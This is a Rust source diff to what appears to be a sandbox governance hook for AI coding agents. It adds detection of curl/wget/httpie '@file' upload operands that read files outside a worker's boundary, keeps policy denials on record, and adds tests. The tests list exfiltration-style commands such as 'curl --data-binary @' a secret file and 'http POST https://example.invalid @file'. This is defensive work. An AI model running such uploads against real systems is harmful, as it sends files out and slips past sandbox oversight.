@@ -270,6 +270,10 @@ const WRITE_TOOLS: [&str; 3] = ["Write", "Edit", "NotebookEdit"];
 /// (crew#634 R7) The leading text of a sibling-worktree read refusal.
 pub(crate) const SIBLING_WORKTREE_REASON_PREFIX: &str = "worker fence:";
 
+// Only the new shell-read refusals continue to policy evaluation after being recorded.
+const SHELL_READ_REASON_PREFIX: &str = "Shell read leaves the unit boundary:";
+const SIBLING_SHELL_READ_REASON_PREFIX: &str = "worker fence: shell command";
+
 /// (crew#634 R7) The remedy a sibling-worktree read refusal carries to the seat.
 pub(crate) const SIBLING_WORKTREE_REMEDY: &str = "a seat reads its own worktree and the \
     repository's checked-in files, never another run's in-progress tree under `wicked-worktrees/`; \
@@ -946,6 +950,9 @@ pub(crate) fn boundary_denial_tracked(
     // An existing absolute path used as a SEARCH PATTERN (`rg '/etc/hosts' src/`) is also
     // judged as an operand: a rare advisory false positive accepted by the program-agnostic scan.
     // A heredoc piped into a shell (`cat <<'EOF' | sh`) is also an accepted literal-scan limit.
+    // A data heredoc nested inside a shell-fed heredoc (`sh <<'SCRIPT'` containing
+    // `cat <<'DATA'`) can expose literal data to the operand scan: an accepted advisory
+    // false positive when that data names an existing path outside the boundary.
     if is_shell_call(context, tool) {
         if let Some(command) = context.get("command").and_then(serde_json::Value::as_str) {
             // REMOTE-WRITE FENCE (F-7R2-012, wave 6): a `git push` / `gh pr create|merge|edit|
@@ -1109,14 +1116,14 @@ pub(crate) fn boundary_denial_tracked(
                 if let Some(tree) = sibling_worktree_target(&path, context, tool, cwd, home) {
                     advisory.get_or_insert_with(|| {
                         format!(
-                            "{SIBLING_WORKTREE_REASON_PREFIX} shell command `{command}` reads another \
+                            "{SIBLING_SHELL_READ_REASON_PREFIX} `{command}` reads another \
                              run's worktree ({}) — {SIBLING_WORKTREE_REMEDY}",
                             tree.display()
                         )
                     });
                 } else if let Err(d) = crate::path_policy::check(&path, roots, false, cwd, home) {
                     advisory.get_or_insert_with(|| {
-                        format!("Shell read leaves the unit boundary: {d}; command: `{command}`")
+                        format!("{SHELL_READ_REASON_PREFIX} {d}; command: `{command}`")
                     });
                 }
             }
@@ -2423,11 +2430,12 @@ fn existing_shell_read_paths(word: &str, cwd: Option<&Path>, home: Option<&Path>
         .flat_map(|p| {
             let operand = p.strip_prefix('-').and_then(|flags| {
                 #[cfg(not(windows))]
-                let at = flags.find(['/', '~', '.'])?;
+                let at = flags.find(['/', '~', '.', '@'])?;
                 #[cfg(windows)]
                 let at = flags.char_indices().find_map(|(at, c)| {
-                    (matches!(c, '/' | '~' | '.') || starts_with_windows_drive_path(&flags[at..]))
-                        .then_some(at)
+                    (matches!(c, '/' | '~' | '.' | '@')
+                        || starts_with_windows_drive_path(&flags[at..]))
+                    .then_some(at)
                 })?;
                 (at > 0 && flags[..at].bytes().all(|c| c.is_ascii_alphabetic()))
                     .then(|| flags[at..].to_string())
@@ -2435,6 +2443,19 @@ fn existing_shell_read_paths(word: &str, cwd: Option<&Path>, home: Option<&Path>
             std::iter::once(p).chain(operand)
         })
         .filter_map(|p| {
+            // curl/httpie/gh-style file operands, including attached flags and assignments.
+            // Only a leading `@` is special; scp's `user@host:path` is not a local file.
+            if !p.starts_with('@')
+                && p.split_once(':')
+                    .is_some_and(|(host, _)| host.contains('@') && !host.contains(['/', '\\']))
+            {
+                return None;
+            }
+            let p = p.strip_prefix('@').unwrap_or(&p);
+            if p.is_empty() {
+                return None;
+            }
+            let p = p.to_string();
             let p = local_shell_read_path(p)?;
             if p.contains("://") {
                 return None;
@@ -4567,7 +4588,8 @@ pub(crate) fn evaluate_tool_call(
     // Use open_store_ro (SQLITE_OPEN_READONLY, no DDL) so the hook subprocess never races the
     // single-writer actor on schema or WAL operations (P4b).
     // BOUNDARY FIRST — before the store is even OPENED. A call reaching outside the unit's
-    // worktree is refused before any policy is consulted: policies answer "is this action allowed
+    // worktree is refused before any policy is consulted, except new shell-read advisories,
+    // which must retain main's policy decision too. Policies answer "is this action allowed
     // HERE", and a path outside the boundary has already left here. It is also refused before the
     // store-open below, because a boundary escape needs NO policy store to judge — an unreachable
     // store used to mask a boundary escape as `infra-deny`, losing the claim the fold and the
@@ -4589,7 +4611,11 @@ pub(crate) fn evaluate_tool_call(
         ),
         None => boundary_denial(context, tool, &install_state),
     };
+    let mut shell_read_denied = false;
     if let Some((reason, fatal)) = boundary_verdict {
+        shell_read_denied = !fatal
+            && (reason.starts_with(SHELL_READ_REASON_PREFIX)
+                || reason.starts_with(SIBLING_SHELL_READ_REASON_PREFIX));
         // The tool-call is BLOCKED either way (return 2 below). A WRITE outside the sandbox is an
         // escape attempt and stays unit-FATAL; a READ probe — and a benign write into the worker's
         // own `~/.claude` state tree (core#235) — is ADVISORY: blocked, audited, but not unit-fatal,
@@ -4638,7 +4664,9 @@ pub(crate) fn evaluate_tool_call(
             append_boundary_deny(decisions_path, scope, phase, tool, &reason, fatal);
         }
         eprintln!("wicked-governance: DENY ({reason})");
-        return 2;
+        if !shell_read_denied {
+            return 2;
+        }
     }
 
     // PHASE SCOPE — the SECOND boundary (core#296), judged next and for the same reasons the
@@ -4784,6 +4812,11 @@ pub(crate) fn evaluate_tool_call(
         }
     };
     let claim = decide(&selected, scope, phase, context, crate::clock::eval_now());
+    // The read refusal is already audited. Preserve a policy Deny's own fatal claim below,
+    // but do not append an Allow for a blocked call or update allowed-call cwd/witness state.
+    if shell_read_denied && claim.decision != Decision::Deny {
+        return 2;
+    }
 
     // Write the tool-call annotation AND the claim as a SINGLE buffer under the advisory lock.
     // Using one buffer means that even if `with_append_lock` degrades to running without the lock
@@ -10075,6 +10108,142 @@ mod boundary_tests {
 
     fn ctx(path: &str) -> serde_json::Value {
         json!({ "path": path })
+    }
+
+    #[test]
+    fn shell_read_951_r8_advisory_preserves_policy_denial() {
+        let (dir, scratch, outside) = shell_read_951_r2_fixture("r8-policy");
+        let sibling = dir.join("wicked-worktrees/run-2");
+        std::fs::create_dir_all(&sibling).unwrap();
+        std::fs::write(sibling.join("secret"), "secret").unwrap();
+        for with_policy in [false, true] {
+            let policy_db = dir.join(format!("policy-{with_policy}.db"));
+            {
+                let mut store =
+                    wicked_apps_core::open_store(Some(policy_db.to_str().unwrap())).unwrap();
+                if with_policy {
+                    wicked_governance::register_policy(
+                        &mut store,
+                        &wicked_governance::Policy {
+                            id: "pol-shell-read-bash".into(),
+                            kind: "ops".into(),
+                            applies_to: vec!["tool:Bash".into()],
+                            effect: wicked_governance::Effect::Deny,
+                            trigger: wicked_governance::Trigger { contains: None },
+                            obligations: vec![],
+                            criteria: "no shell in this test".into(),
+                            severity: wicked_governance::Severity::High,
+                            rule: "Deny every Bash call.".into(),
+                            retired: false,
+                        },
+                    )
+                    .unwrap();
+                }
+            }
+            let boundary = BoundaryCtx {
+                roots: crate::path_policy::AllowedRoots {
+                    write: vec![scratch.clone()],
+                    read: vec![dir.join("wicked-worktrees")],
+                },
+                cwd: scratch.clone(),
+                home: None,
+                claude_config_dir: None,
+                pre_build_scope: false,
+                write_posture: crate::write_posture::WritePosture::Full,
+                deliverable_roots: vec![],
+                estate_store_pinned: false,
+                graph_write_dir: None,
+                graph_store_db: None,
+            };
+            for (kind, context, continues) in [
+                (
+                    "outside",
+                    json!({"command": format!("cat {}", shell_read_951_path(&outside.join("tip.mjs")))}),
+                    true,
+                ),
+                (
+                    "sibling",
+                    json!({"command": format!("cat {}", shell_read_951_path(&sibling.join("secret")))}),
+                    true,
+                ),
+                // Earlier advisory classes keep their boundary-first early return.
+                ("direct", json!({"path": outside.join("tip.mjs")}), false),
+                (
+                    "write",
+                    json!({"command": format!("echo x > {}", shell_read_951_path(&std::env::temp_dir().join("951-r8-write")))}),
+                    false,
+                ),
+            ] {
+                let log = dir.join(format!("decisions-{with_policy}-{kind}.jsonl"));
+                assert_eq!(
+                    evaluate_tool_call(
+                        "wicked-agent/951-r8",
+                        "build",
+                        None,
+                        None,
+                        Some(policy_db.to_str().unwrap()),
+                        log.to_str().unwrap(),
+                        &context,
+                        "Bash",
+                        Some(&boundary),
+                    ),
+                    2,
+                    "{with_policy}: {kind}"
+                );
+                let claims: Vec<ConformanceClaim> = std::fs::read_to_string(&log)
+                    .unwrap()
+                    .lines()
+                    .filter_map(|line| serde_json::from_str(line).ok())
+                    .collect();
+                let denies: Vec<_> = claims
+                    .iter()
+                    .filter(|claim| claim.decision == Decision::Deny)
+                    .collect();
+                assert_eq!(claims.len(), denies.len(), "{claims:?}");
+                assert_eq!(
+                    denies.len(),
+                    if with_policy && continues { 2 } else { 1 },
+                    "{with_policy}: {kind}: {claims:?}"
+                );
+                assert!(is_advisory_deny(denies[0]), "{claims:?}");
+                if with_policy && continues {
+                    assert_eq!(denies[1].policy_ids, ["pol-shell-read-bash"]);
+                    assert!(!is_advisory_deny(denies[1]), "{claims:?}");
+                }
+                assert!(!install_fence_cwd_path(log.to_str().unwrap(), "build").exists());
+                assert!(!write_root_witness_path(log.to_str().unwrap(), "build").exists());
+            }
+        }
+    }
+
+    #[test]
+    fn shell_read_951_r8_at_file_operands() {
+        let (_, scratch, outside) = shell_read_951_r2_fixture("r8-at-file");
+        let path = outside.join("secret file");
+        std::fs::write(&path, "secret").unwrap();
+        let file = shell_read_951_path(&path);
+        shell_read_951_r2_assert_reads(
+            &scratch,
+            &outside,
+            &[
+                format!("curl @{file}"),
+                format!("curl -d@{file}"),
+                format!("curl --data-binary @{file}"),
+                format!("curl --data=@{file}"),
+                format!("curl -F field=@{file}"),
+                format!("wget --post-file=@{file}"),
+                format!("http POST https://example.invalid @{file}"),
+                format!("reader --input @{file}"),
+                "curl --data-binary @../outside/tip.mjs".into(),
+            ],
+        );
+        // Even existing filenames with these spellings are not local @file operands.
+        std::fs::write(scratch.join("@"), "not an operand").unwrap();
+        #[cfg(not(windows))]
+        std::fs::write(scratch.join("user@host:path"), "not an operand").unwrap();
+        for word in ["@", "user@host:path"] {
+            assert!(existing_shell_read_paths(word, Some(&scratch), None).is_empty());
+        }
     }
 
     #[test]
